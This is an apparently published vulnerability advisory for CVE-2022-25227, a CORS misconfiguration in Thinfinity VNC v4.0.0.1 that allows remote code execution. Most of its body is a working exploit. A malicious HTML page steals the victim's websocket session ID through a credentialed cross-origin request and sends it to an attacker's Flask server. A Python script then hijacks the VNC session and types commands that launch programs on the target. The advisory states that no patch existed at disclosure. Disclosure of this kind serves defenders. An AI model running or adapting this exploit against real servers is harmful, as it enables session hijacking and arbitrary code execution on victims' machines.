---
slug: advisories/clapton/
title: Thinfinity VNC v4.0.0.1 - CORS Misconfiguration to RCE
authors: Oscar Uribe
writer: ouribe
codename: clapton
product: Thinfinity VNC v4.0.0.1
date: 2022-04-11 11:00 COT
cveid: CVE-2022-25227
severity: 8.3
description: Thinfinity VNC v4.0.0.1 - CORS Misconfiguration to RCE
keywords: Fluid Attacks, Security, Vulnerabilities, VNC, Thinfinity
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                         |                                                            |
|-------------------------|------------------------------------------------------------|
| **Name**                | Thinfinity VNC v4.0.0.1 - CORS Misconfiguration to RCE     |
| **Code name**           | [Clapton](https://en.wikipedia.org/wiki/Eric_Clapton)      |
| **Product**             | Thinfinity VNC                                             |
| **Affected versions**   | v4.0.0.1                                                   |
| **State**               | Public                                                     |
| **Release date**        | 2022-05-17                                                 |

## Vulnerability

|                       |                                                                  |
|-----------------------|------------------------------------------------------------------|
| **Kind**              | CORS Misconfiguration                                            |
| **Rule**              | [134. Insecure or unset HTTP headers - CORS](https://docs.fluidattacks.com/criteria/vulnerabilities/134)   |
| **Remote**            | Yes                                                              |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H                     |
| **CVSSv3 Base Score** | 8.3                                                              |
| **Exploit available** | Yes                                                              |
| **CVE ID(s)**         | [CVE-2022-25227](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25227)                                                    |

## Description

Thinfinity VNC v4.0.0.1 contains a Cross-Origin
Resource Sharing (CORS) vulnerability which can
allow an unprivileged remote attacker, if they can
trick a user into browse malicious site, to obtain
an `ID` that can be used to send websocket
requests and achieve RCE.

## Proof of Concept

1. Create a malicious site with the following
   content and send it to the victim.

    ```html
    <!DOCTYPE html>
    <html>
    <body>
    <center>
    <h2>CORS Thinfinity POC Exploit</h2>
    <h3>Extract ID</h3>

    <div id="demo">
    <button type="button" onclick="cors()">Exploit</button>
    </div>

    <script>
    function cors() {

    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {

            response = JSON.parse(this.responseText)
            id_str = response['id']

            id_str = id_str.slice(1, id_str.length - 1)

            alert("Exfiltrated ID: " + id_str)
            alert("Do you want to send the exploit?")

            const flask_http = new XMLHttpRequest();

            // Server to exfiltrate the websocket id

            // CHANGE THIS
            var exf_server = "127.0.0.1:5000"
            const url = "http://" + exf_server + "/cors?id=" + id_str


            // Send ID to flask application
            flask_http.open("GET", url)
            flask_http.send()

            flask_http.onreadystatechange = function() {
                    alert('Done!!!')
            }

        }
    };

    // exfiltrate ID using CORS vulnerability

    // CHANGE THIS

    var server = "172.16.28.140:8081"
    xhttp.open("GET", "http://" + server + "/vnc/cmd?cmd=connect&wscompression=true&destAddr=&screenWidth=1308&screenHeight=741&orientation=90&browserWidth=654&browserHeight=627&supportCur=true&id=null&devicePixelRatio=1&isMobile=false&isLandscape=true&supportsFullScreen=true&webapp=false", true);
    xhttp.withCredentials = true;
    xhttp.send();
    }


    </script>

    </body>
    </html>
    ```

2. Create a web socket connection against the target
   server using the exfiltrated `ID`.
   The following PoC sends the Ctrl+Esc
   keystroke combination to the server.

    ```python
    from websocket import create_connection
    import time

    # CHANGE THIS
    id_str ="D6647736-7489-4FA3-9620-25F2DC7FA1F6"

    ws = create_connection("ws://172.16.28.140:8081/vnc/%7B" + id_str + "%7D")
    command = "cmd=fkey&key=CtrlEsc&id={" + id_str + "}"
    ws.send(command)
    ```

3. The exploit below can be used to send arbitrary
   commands to the server after the `ID` is exfiltrated.
   It uses the `ID` to hijack the VNC connection and send
   keystrokes or mouse moves to the server.

## Exploit

* Run the flask application and trick a user with
  a session in Thinfinity to visit the page.

```python

# export FLASK_APP=exploit_thinfinity
# flask run --host=0.0.0.0

from flask import Flask, request, redirect
from websocket import create_connection
import time
import socket

app = Flask(__name__)


# CHANGE THIS
server = "192.168.1.7:8081"


def current_ip():
    return([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0])


def send_enter(ws, str_id):
    ws.send("cmd=keyb&key=13&char=0&action=down&id={" + str_id + "}")
    time.sleep(1)

def send_ctrl_esc(ws, str_id):
    ws.send("cmd=fkey&key=CtrlEsc&id={%s}" % str_id)
    time.sleep(1)

def send_text(ws, cmd, str_id):

    for c in cmd:
        key = str(ord(c))

        command  = "cmd=keyb&key=66&action=down&id={%s}&char=%s&location=0" % (str_id,key)
        ws.send(command)
        time.sleep(0.2)

    time.sleep(2)


@app.route("/exploit")
def about():

    ip = request.host.split(':')[0]

    return """
        <!DOCTYPE html>
        <html>
        <body>
        <center>
        <h2>CORS Thinfinity POC Exploit</h2>
        <h3>Extract ID</h3>

        <div id="demo">
        <button type="button" onclick="cors()">Exploit</button>
        </div>

        <script>
        function cors() {

        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {

                response = JSON.parse(this.responseText)
                id_str = response['id']

                id_str = id_str.slice(1, id_str.length - 1)

                alert("Exfiltrated ID: " + id_str)
                alert("Do you want to send the exploit?")

                const flask_http = new XMLHttpRequest();

                // Server to exfiltrate the websocket id

                // CHANGE THIS
                var exf_server = "%s:5000"
                const url = "http://" + exf_server + "/cors?id=" + id_str


                // Send ID to flask application
                flask_http.open("GET", url)
                flask_http.send()

                flask_http.onreadystatechange = function() {
                        alert('Done!!!')
                }

            }
        };

        // exfiltrate ID using CORS vulnerability

        // CHANGE THIS

        var server = "%s"
        xhttp.open("GET", "http://" + server + "/vnc/cmd?cmd=connect&wscompression=true&destAddr=&screenWidth=1308&screenHeight=741&orientation=90&browserWidth=654&browserHeight=627&supportCur=true&id=null&devicePixelRatio=1&isMobile=false&isLandscape=true&supportsFullScreen=true&webapp=false", true);
        xhttp.withCredentials = true;
        xhttp.send();
        }


        </script>
        </body>
        </html>
    """ % (ip, server)


@app.route('/cors',methods=['GET'])
def cors():
    str_id = request.args.get('id')
    print(str_id)



    socket_url = "ws://" + server +  "/vnc/%7B"+ str_id +"%7D"
    ws = create_connection(socket_url)

    send_ctrl_esc(ws,str_id)

    send_text(ws,"run",str_id)
    send_enter(ws,str_id)

    send_text(ws,"calc.exe",str_id)
    send_enter(ws,str_id)

    return str_id

@app.route("/")
def index():
    return redirect('/exploit')
```

## Mitigation

By 2022-05-17 there is not a patch resolving the issue.

## Credits

The vulnerability was discovered by [Oscar
Uribe](https://co.linkedin.com/in/oscar-uribe-londo%C3%B1o-0b6534155) from the Offensive
Team of  `Fluid Attacks`.

## References

|                     |                                                                     |
|---------------------|---------------------------------------------------------------------|
| **Vendor page**     | <https://www.cybelesoft.com/thinfinity/>                            |

## Timeline

* 2022-04-11: Vulnerability discovered.

* 2022-04-11: Vendor contacted.

* 2022-05-17: Public disclosure.